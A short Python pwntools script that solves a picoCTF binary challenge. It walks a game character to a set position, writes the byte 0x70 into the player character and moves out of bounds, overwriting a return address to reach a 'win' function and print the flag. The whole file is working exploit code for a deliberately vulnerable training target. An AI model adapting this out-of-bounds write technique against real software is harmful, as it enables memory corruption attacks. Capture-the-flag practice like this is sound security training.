# picoCTF--exploit.py
# by Aidan Wech (ahwech)
# nc saturn.picoctf.net xxxxx

from pwn import *

def main():
    # connection variables (remember to start up instance on picoCTF, port will vary!)
    host = "saturn.picoctf.net"
    port = 57664

    # variables
    start_x = 4
    start_y = 4
    exploit_x = 51 - start_x

    # connect to instance and deliver payload
    p = remote(host, port)

    with context.silent:
        p.recvuntil(b"X\r\n", timeout=3)
        
        # move to proper x point
        for i in range(exploit_x):
            p.sendline(b"d")
            p.recvuntil(b"X\r\n", timeout=3)
        
        # change player char to last byte in win nop chain addr
        p.sendline(b"l\x70")
        
        # move to proper y point to go OOB
        for i in range(start_y):
            p.sendline(b"w")
            p.recvuntil(b"X\r\n", timeout=3)
        
        p.sendline(b"w")
        flag = "picoCTF" + p.recvall(timeout=5).decode().split("picoCTF")[1]
        p.close()

    # print flag
    log.info(f"flag: {flag}")

if __name__ == "__main__":
    main()